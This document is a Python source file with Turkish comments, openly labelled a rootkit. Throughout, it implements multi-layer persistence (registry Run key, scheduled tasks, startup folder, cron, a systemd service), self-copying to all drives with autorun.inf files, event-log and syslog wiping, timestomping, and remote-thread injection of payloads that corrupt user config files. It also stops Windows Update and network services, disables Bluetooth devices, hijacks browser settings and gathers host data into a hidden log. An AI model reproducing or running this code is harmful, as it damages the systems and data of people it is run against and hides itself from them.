import os
import sys
import time
import random
import string
import platform
import uuid
import hashlib
import psutil
import subprocess
import threading
import ctypes
import ctypes.wintypes
import socket
import getpass
import json
from cryptography.fernet import Fernet
from base64 import b64encode, b64decode
from datetime import datetime

# Platform kontrolü
is_windows = platform.system() == "Windows"

# Linux için xattr (opsiyonel)
try:
    import xattr
except ImportError:
    xattr = None

# Log dosyası
LOG_FILE = os.path.join(os.path.expanduser("~"), ".sys_cache")

# Polimorfik veri
def generate_polymorphic_data():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    data = os.urandom(512)
    return cipher.encrypt(data), key

# Şifreli loglama
def log_error(message):
    try:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted_message = cipher.encrypt(message.encode()).decode()
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()}: {encrypted_message} (Key: {key.decode()})\n")
        if is_windows:
            import win32api
            import win32con
            win32api.SetFileAttributes(LOG_FILE, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        else:
            os.chmod(LOG_FILE, 0o600)
        file_time_stomping(LOG_FILE)
    except:
        pass

# Sahte sistem çağrıları
def fake_system_call():
    try:
        subprocess.run([sys.executable, "-c", "import time; time.sleep(0.0005)"], 
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=0.1)
    except:
        pass

# Kod obfuscation
def obfuscate_code(code):
    key = Fernet.generate_key()
    cipher = Fernet(key)
    return b64encode(cipher.encrypt(code.encode())).decode()

# File Time Stomping
def file_time_stomping(file_path):
    try:
        system_time = (os.path.getmtime(sys.executable) if is_windows else os.path.getmtime("/bin/bash"))
        os.utime(file_path, (system_time, system_time))
    except Exception as e:
        log_error(f"File Time Stomping failed: {str(e)}")

# Sistem bilgisi toplama ve yerel loga kaydetme
def collect_and_save_info():
    try:
        # Sistem bilgileri
        system_info = {
            "os": platform.system(),
            "os_version": platform.version(),
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "cpu_count": psutil.cpu_count(),
            "ram_total": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            "disk_total": f"{psutil.disk_usage('/').total / (1024**3):.2f} GB",
            "processes": [p.name() for p in psutil.process_iter()[:5]]
        }

        # Ağ bilgileri
        network_info = {
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "mac_address": ":".join(hex(uuid.getnode())[i:i+2] for i in range(2, 14, 2)),
            "gateway": subprocess.run(["ip", "route"], capture_output=True, text=True).stdout.split("default via ")[1].split(" ")[0] if not is_windows else "N/A"
        }

        # Kullanıcı verileri
        user_data = {
            "env_vars": {k: v for k, v in os.environ.items() if k in ["PATH", "HOME", "USERPROFILE"]},
            "browser_cookies": []
        }
        try:
            cookie_dir = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Cookies") if is_windows else os.path.expanduser("~/.config/google-chrome/Default/Cookies")
            if os.path.exists(cookie_dir):
                user_data["browser_cookies"] = ["Cookies file detected"]
        except:
            pass

        # Verileri şifrele ve loga kaydet
        key = Fernet.generate_key()
        cipher = Fernet(key)
        data = json.dumps({"system": system_info, "network": network_info, "user": user_data}).encode()
        encrypted_data = cipher.encrypt(data).decode()
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()}: {encrypted_data} (Key: {key.decode()})\n")
        if is_windows:
            import win32api
            import win32con
            win32api.SetFileAttributes(LOG_FILE, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        else:
            os.chmod(LOG_FILE, 0o600)
        file_time_stomping(LOG_FILE)
        return True
    except Exception as e:
        log_error(f"Collect and save info failed: {str(e)}")
        return False

# Bluetooth ve diğer aygıtları bozma (USB hariç)
def disrupt_devices():
    try:
        if is_windows:
            # Windows: SetupDi API ile Bluetooth cihazlarını devre dışı bırakma
            import win32com.client
            wmi = win32com.client.GetObject("winmgmts:")
            devices = wmi.ExecQuery("SELECT * FROM Win32_PnPEntity WHERE PNPClass='Bluetooth'")
            for device in devices:
                try:
                    device.Disable()
                except:
                    pass
        else:
            # Linux/Mac: bluetoothctl ile cihaz bağlantısını kesme
            try:
                subprocess.run(["bluetoothctl", "disconnect"], capture_output=True, timeout=5)
            except:
                pass
        return True
    except Exception as e:
        log_error(f"Device disruption failed: {str(e)}")
        return False

# Sistem servislerini gizlice bozma
def disrupt_services():
    try:
        if is_windows:
            # Windows Update servisini durdurma
            subprocess.run(["net", "stop", "wuauserv"], shell=True, capture_output=True)
        else:
            # Linux/Mac: systemd servislerini manipüle etme
            subprocess.run(["systemctl", "stop", "network-manager"], capture_output=True)
        return True
    except Exception as e:
        log_error(f"Service disruption failed: {str(e)}")
        return False

# Gizli bellek sızıntısı
def memory_leak():
    try:
        def leak():
            memory_hog = []
            while True:
                memory_hog.append(os.urandom(1024 * 1024))  # 1MB bloklar
                if len(memory_hog) > 50:  # Sınırla
                    memory_hog.pop(0)
                time.sleep(0.5)
        threading.Thread(target=leak, daemon=True).start()
        return True
    except Exception as e:
        log_error(f"Memory leak failed: {str(e)}")
        return False

# Tarayıcı ayar manipülasyonu
def browser_manipulation():
    try:
        # Örnek: Chrome ayar dosyasını manipüle etme
        pref_file = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Preferences") if is_windows else os.path.expanduser("~/.config/google-chrome/Default/Preferences")
        if os.path.exists(pref_file):
            with open(pref_file, "r+") as f:
                data = json.load(f)
                data["homepage"] = "http://example.com"
                data["search_provider"] = {"search_url": "http://example.com/search?q={searchTerms}"}
                f.seek(0)
                json.dump(data, f)
                f.truncate()
        return True
    except Exception as e:
        log_error(f"Browser manipulation failed: {str(e)}")
        return False

# Anti-Forensics
def anti_forensics():
    try:
        if is_windows:
            subprocess.run(["wevtutil", "cl", "Application"], shell=True, capture_output=True)
        else:
            with open("/var/log/syslog", "w") as f:
                f.write("")
        return True
    except Exception as e:
        log_error(f"Anti-Forensics failed: {str(e)}")
        return False

# Environment Variable Manipulation
def env_manipulation():
    try:
        var_name = f"SYS_{random.randint(1000, 9999)}_{uuid.uuid4()}"
        var_value = os.path.join(os.path.expanduser("~"), f"sys_{uuid.uuid4()}.bin")
        os.environ[var_name] = var_value
        with open(var_value, "wb") as f:
            f.write(generate_polymorphic_data()[0])
        if is_windows:
            import win32api
            import win32con
            win32api.SetFileAttributes(var_value, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        else:
            os.chmod(var_value, 0o600)
        file_time_stomping(var_value)
        return True
    except Exception as e:
        log_error(f"Environment Manipulation failed: {str(e)}")
        return False

# Delayed Execution
def delayed_execution(func, progress, total_steps):
    try:
        time.sleep(random.uniform(2, 10))  # Hızlı yürütme için 2-10s gecikme
        result = func()
        if "main" in sys.argv:
            print(f"%{int((progress / total_steps) * 100)} tamamlandı")
        return result
    except Exception as e:
        log_error(f"Delayed Execution failed for {func.__name__}: {str(e)}")
        if "main" in sys.argv:
            print(f"%{int((progress / total_steps) * 100)} tamamlandı (hata oluştu)")
        return False

# Dynamic API Resolution
def dynamic_api_resolve():
    try:
        if is_windows:
            kernel32 = ctypes.WinDLL("kernel32.dll")
            create_file = ctypes.cast(
                kernel32.GetProcAddress(kernel32._handle, b"CreateFileW"),
                ctypes.WINFUNCTYPE(ctypes.c_void_p)
            )
            fake_system_call()
            return create_file
        return lambda: None
    except Exception as e:
        log_error(f"Dynamic API Resolution failed: {str(e)}")
        return None

# Process Hollowing
def process_hollowing(target_process="svchost.exe"):
    try:
        if is_windows:
            for proc in psutil.process_iter():
                if proc.name().lower() == target_process.lower():
                    pid = proc.pid
                    break
            else:
                log_error("Process Hollowing: Target process not found")
                return False

            # Zararlı payload: Dosya bozma + cihaz bozma
            payload = b"""
            import os
            import json
            def harm():
                try:
                    with open(os.path.expanduser('~/user_config.txt' if os.name == 'nt' else '~/.config/user.conf'), 'w') as f:
                        f.write('CORRUPTED')
                    import win32com.client
                    wmi = win32com.client.GetObject("winmgmts:")
                    devices = wmi.ExecQuery("SELECT * FROM Win32_PnPEntity WHERE PNPClass='Bluetooth'")
                    for device in devices:
                        device.Disable()
                except:
                    pass
            harm()
            """
            payload = obfuscate_code(payload).encode()

            process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
            if not process_handle:
                log_error("Process Hollowing: Failed to open process")
                return False

            mem = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(payload), 0x3000, 0x40)
            ctypes.windll.kernel32.WriteProcessMemory(process_handle, mem, payload, len(payload), None)
            ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, mem, None, 0, None)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return True
        else:
            # Linux/Mac için alternatif: Bluetooth bozma
            try:
                subprocess.run([sys.executable, "-c", "import os; os.system('bluetoothctl disconnect')"], capture_output=True)
                return True
            except:
                log_error("Process Hollowing: Linux/Mac injection failed")
                return False
    except Exception as e:
        log_error(f"Process Hollowing failed: {str(e)}")
        return False

# Process Doppelgänging
def process_doppelganging(target_process="svchost.exe"):
    try:
        if is_windows:
            for proc in psutil.process_iter():
                if proc.name().lower() == target_process.lower():
                    pid = proc.pid
                    break
            else:
                log_error("Process Doppelgänging: Target process not found")
                return False

            # Zararlı payload: Dosya bozma + servis bozma
            payload = b"""
            import os
            import subprocess
            def harm():
                try:
                    with open(os.path.expanduser('~/user_config.txt' if os.name == 'nt' else '~/.config/user.conf'), 'w') as f:
                        f.write('CORRUPTED')
                    subprocess.run(['net', 'stop', 'wuauserv'], shell=True, capture_output=True)
                except:
                    pass
            harm()
            """
            payload = obfuscate_code(payload).encode()

            process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
            if not process_handle:
                log_error("Process Doppelgänging: Failed to open process")
                return False

            mem = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(payload), 0x3000, 0x40)
            ctypes.windll.kernel32.WriteProcessMemory(process_handle, mem, payload, len(payload), None)
            ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, mem, None, 0, None)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return True
        else:
            # Linux/Mac için alternatif: Servis bozma
            try:
                subprocess.run([sys.executable, "-c", "import os; os.system('systemctl stop network-manager')"], capture_output=True)
                return True
            except:
                log_error("Process Doppelgänging: Linux/Mac injection failed")
                return False
    except Exception as e:
        log_error(f"Process Doppelgänging failed: {str(e)}")
        return False

# Reflective DLL Injection
def reflective_dll_injection(target_process="explorer.exe"):
    try:
        if is_windows:
            for proc in psutil.process_iter():
                if proc.name().lower() == target_process.lower():
                    pid = proc.pid
                    break
            else:
                log_error("Reflective DLL Injection: Target process not found")
                return False

            # Zararlı payload: Dosya bozma + tarayıcı manipülasyonu
            payload = b"""
            import os
            import json
            def harm():
                try:
                    with open(os.path.expanduser('~/user_config.txt' if os.name == 'nt' else '~/.config/user.conf'), 'w') as f:
                        f.write('CORRUPTED')
                    pref_file = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/Preferences')
                    if os.path.exists(pref_file):
                        with open(pref_file, 'r+') as f:
                            data = json.load(f)
                            data['homepage'] = 'http://example.com'
                            f.seek(0)
                            json.dump(data, f)
                            f.truncate()
                except:
                    pass
            harm()
            """
            payload = obfuscate_code(payload).encode()

            process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
            if not process_handle:
                log_error("Reflective DLL Injection: Failed to open process")
                return False

            mem = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(payload), 0x3000, 0x40)
            ctypes.windll.kernel32.WriteProcessMemory(process_handle, mem, payload, len(payload), None)
            ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, mem, None, 0, None)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return True
        else:
            # Linux/Mac için alternatif: Tarayıcı manipülasyonu
            try:
                subprocess.run([sys.executable, "-c", "import os, json; pref_file = os.path.expanduser('~/.config/google-chrome/Default/Preferences'); open(pref_file, 'r+').write(json.dumps({'homepage': 'http://example.com'}))"], capture_output=True)
                return True
            except:
                log_error("Reflective DLL Injection: Linux/Mac injection failed")
                return False
    except Exception as e:
        log_error(f"Reflective DLL Injection failed: {str(e)}")
        return False

# Alternate Data Streams
def ads_hide():
    try:
        if is_windows:
            ads_path = f"{os.path.expanduser('~')}\\user_config.txt:void_{uuid.uuid4()}"
            encrypted_data, _ = generate_polymorphic_data()
            with open(ads_path, "wb") as f:
                f.write(encrypted_data)
            return True
        return True
    except Exception as e:
        log_error(f"ADS Hide failed: {str(e)}")
        return False

# Service Masquerade
def service_masquerade():
    try:
        if is_windows:
            subprocess.run(["sc", "create", f"SysUpdate_{uuid.uuid4()}", "binpath=", sys.executable + " " + os.path.abspath(__file__) + " silent", "type=", "own"], 
                          shell=True, capture_output=True)
        else:
            with open(os.path.expanduser("~/.config/systemd/user/sysupdate.service"), "w") as f:
                f.write(f"""
[Unit]
Description=System Update Service
[Service]
ExecStart={sys.executable} {os.path.abspath(__file__)} silent
Restart=always
[Install]
WantedBy=default.target
                """)
            subprocess.run(["systemctl", "--user", "enable", "sysupdate.service"], capture_output=True)
        return True
    except Exception as e:
        log_error(f"Service Masquerade failed: {str(e)}")
        return False

# Kalıcılık: Çok katmanlı (Kullanıcı düzeyinde)
def ensure_persistence():
    success = False
    try:
        if is_windows:
            try:
                import winreg
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(key, f"SysRun_{uuid.uuid4()}", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__) + " silent")
                winreg.CloseKey(key)
                success = True
            except Exception as e:
                log_error(f"Registry Persistence failed: {str(e)}")

            task_name = f"SysTask_{uuid.uuid4()}"
            result = subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", f"{sys.executable} {os.path.abspath(__file__)} silent", "/sc", "onlogon"], 
                                   shell=True, capture_output=True)
            if result.returncode == 0:
                success = True
            else:
                log_error(f"Scheduled Task Persistence failed: {result.stderr.decode()}")

            startup_path = os.path.join(os.path.expanduser("~"), r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup", f"sys_{uuid.uuid4()}.py")
            with open(__file__, "r") as src, open(startup_path, "w") as dst:
                dst.write(src.read())
            import win32api
            import win32con
            win32api.SetFileAttributes(startup_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
            file_time_stomping(startup_path)
            success = True

            try:
                import win32com.client
                wmi = win32com.client.GetObject("winmgmts:")
                event = wmi.ExecNotificationQuery("SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'")
                while True:
                    event.NextEvent()
                    subprocess.Popen([sys.executable, os.path.abspath(__file__), "silent"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    success = True
                    break
            except Exception as e:
                log_error(f"WMI Persistence failed: {str(e)}")
        else:
            cron_path = os.path.expanduser(f"~/.config/cron_{uuid.uuid4()}")
            with open(cron_path, "w") as f:
                f.write(f"@reboot {sys.executable} {os.path.abspath(__file__)} silent &\n")
            result = subprocess.run(["crontab", cron_path], capture_output=True)
            if result.returncode == 0:
                success = True
            else:
                log_error(f"Crontab Persistence failed: {result.stderr.decode()}")

            with open(os.path.expanduser("~/.config/systemd/user/sysupdate.service"), "w") as f:
                f.write(f"""
[Unit]
Description=System Update Service
[Service]
ExecStart={sys.executable} {os.path.abspath(__file__)} silent
Restart=always
[Install]
WantedBy=default.target
                """)
            result = subprocess.run(["systemctl", "--user", "enable", "sysupdate.service"], capture_output=True)
            if result.returncode == 0:
                success = True
            else:
                log_error(f"Systemd Persistence failed: {result.stderr.decode()}")

            profile_path = os.path.expanduser(f"~/.profile.d/sys_{uuid.uuid4()}.sh")
            with open(profile_path, "w") as f:
                f.write(f"#!/bin/bash\n{sys.executable} {os.path.abspath(__file__)} silent &\n")
            subprocess.run(["chmod", "+x", profile_path], capture_output=True)
            success = True
        return success
    except Exception as e:
        log_error(f"Persistence failed: {str(e)}")
        return success

# Kendini kopyalama (Güncellendi)
def self_replicate():
    try:
        # Mevcut diskleri tespit et
        drives = []
        if is_windows:
            import win32api
            drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
        else:
            drives = [part.mountpoint for part in psutil.disk_partitions() if 'cdrom' not in part.opts.lower()]

        success = False
        # Kendi kodunu oku
        with open(__file__, "r") as src:
            self_code = src.read()

        # Her diske kopyala
        for drive in drives:
            try:
                # Ana betiği kopyala
                copy_name = f"sys_update_{random.randint(1000, 9999)}_{uuid.uuid4()}.py"
                copy_path = os.path.join(drive, copy_name)
                with open(copy_path, "w") as dst:
                    dst.write(self_code)
                
                # Autorun.inf dosyası oluştur
                autorun_path = os.path.join(drive, "autorun.inf")
                with open(autorun_path, "w") as f:
                    f.write(f"""
[AutoRun]
open={sys.executable} {copy_path} silent
action=Run System Update
""")
                
                # .bin ve .rom dosyaları oluştur
                bin_path = os.path.join(drive, f"sys_{uuid.uuid4()}.bin")
                rom_path = os.path.join(drive, f"sys_{uuid.uuid4()}.rom")
                with open(bin_path, "w") as f:
                    f.write(self_code)
                with open(rom_path, "w") as f:
                    f.write(self_code)
                
                # Dosyaları gizle ve zaman damgasını ayarla
                if is_windows:
                    import win32api
                    import win32con
                    for path in [copy_path, autorun_path, bin_path, rom_path]:
                        win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
                else:
                    for path in [copy_path, autorun_path, bin_path, rom_path]:
                        os.chmod(path, 0o600)
                
                file_time_stomping(copy_path)
                file_time_stomping(autorun_path)
                file_time_stomping(bin_path)
                file_time_stomping(rom_path)
                success = True
            except Exception as e:
                log_error(f"Self Replication failed for {drive}: {str(e)}")

        # Gizli ve sistem disk bölümlerine yazmayı dene (bir kez)
        if is_windows:
            try:
                import win32com.client
                wmi = win32com.client.GetObject("winmgmts:")
                partitions = wmi.ExecQuery("SELECT * FROM Win32_DiskPartition WHERE Bootable = False AND Type LIKE '%System%'")
                for partition in partitions:
                    try:
                        disk_index = partition.DiskIndex
                        partition_index = partition.Index
                        hidden_path = f"\\\\.\\PhysicalDrive{disk_index}"
                        copy_name = f"sys_hidden_{uuid.uuid4()}.py"
                        with open(hidden_path, "w") as f:
                            f.write(self_code)
                        success = True
                    except Exception as e:
                        log_error(f"Hidden partition write failed for {hidden_path}: {str(e)}")
                        continue  # Hata durumunda tekrar deneme
            except Exception as e:
                log_error(f"Hidden partition detection failed: {str(e)}")

        return success
    except Exception as e:
        log_error(f"Self Replication failed: {str(e)}")
        return False

# Memory-Resident
def memory_resident():
    while True:
        try:
            fake_system_call()
            time.sleep(random.uniform(0.1, 0.3))
        except:
            pass

# API Hooking
def api_hook():
    try:
        if is_windows:
            original_api = ctypes.windll.kernel32.CreateFileW
            def hooked_createfile(*args):
                fake_system_call()
                return original_api(*args)
            return True
        return True
    except Exception as e:
        log_error(f"API Hooking failed: {str(e)}")
        return False

# Ana rootkit fonksiyonu
def rootkit():
    try:
        total_steps = 14  # Toplam işlem sayısı
        progress = 0

        # Tüm işlemlerin başarılı olduğunu kontrol et
        success = True
        progress += 1
        success &= anti_forensics()
        if "main" in sys.argv:
            print(f"%{int((progress / total_steps) * 100)} tamamlandı")

        progress += 1
        success &= delayed_execution(env_manipulation, progress, total_steps)

        progress += 1
        success &= delayed_execution(ensure_persistence, progress, total_steps)

        progress += 1
        success &= delayed_execution(service_masquerade, progress, total_steps)

        progress += 1
        success &= delayed_execution(self_replicate, progress, total_steps)

        progress += 1
        success &= delayed_execution(process_hollowing, progress, total_steps)

        progress += 1
        success &= delayed_execution(process_doppelganging, progress, total_steps)

        progress += 1
        success &= delayed_execution(reflective_dll_injection, progress, total_steps)

        progress += 1
        success &= delayed_execution(ads_hide, progress, total_steps)

        progress += 1
        success &= api_hook()
        if "main" in sys.argv:
            print(f"%{int((progress / total_steps) * 100)} tamamlandı")

        progress += 1
        success &= dynamic_api_resolve() is not None
        if "main" in sys.argv:
            print(f"%{int((progress / total_steps) * 100)} tamamlandı")

        progress += 1
        success &= delayed_execution(collect_and_save_info, progress, total_steps)

        progress += 1
        success &= delayed_execution(disrupt_devices, progress, total_steps)

        progress += 1
        success &= delayed_execution(disrupt_services, progress, total_steps)

        progress += 1
        success &= delayed_execution(memory_leak, progress, total_steps)

        progress += 1
        success &= delayed_execution(browser_manipulation, progress, total_steps)

        # Tüm işlemler başarılıysa mesaj yaz ve çık
        if success and "main" in sys.argv:
            print("driverlar başarıyla düzenlendi")
            sys.exit(0)

        # Memory-Resident döngü
        threading.Thread(target=memory_resident, daemon=True).start()

    except Exception as e:
        log_error(f"Rootkit main failed: {str(e)}")

# Ana çalışma
if __name__ == "__main__":
    threading.Thread(target=rootkit, daemon=True).start()
    if "silent" not in sys.argv:
        sys.argv.append("main")
    while True:
        time.sleep(3600)
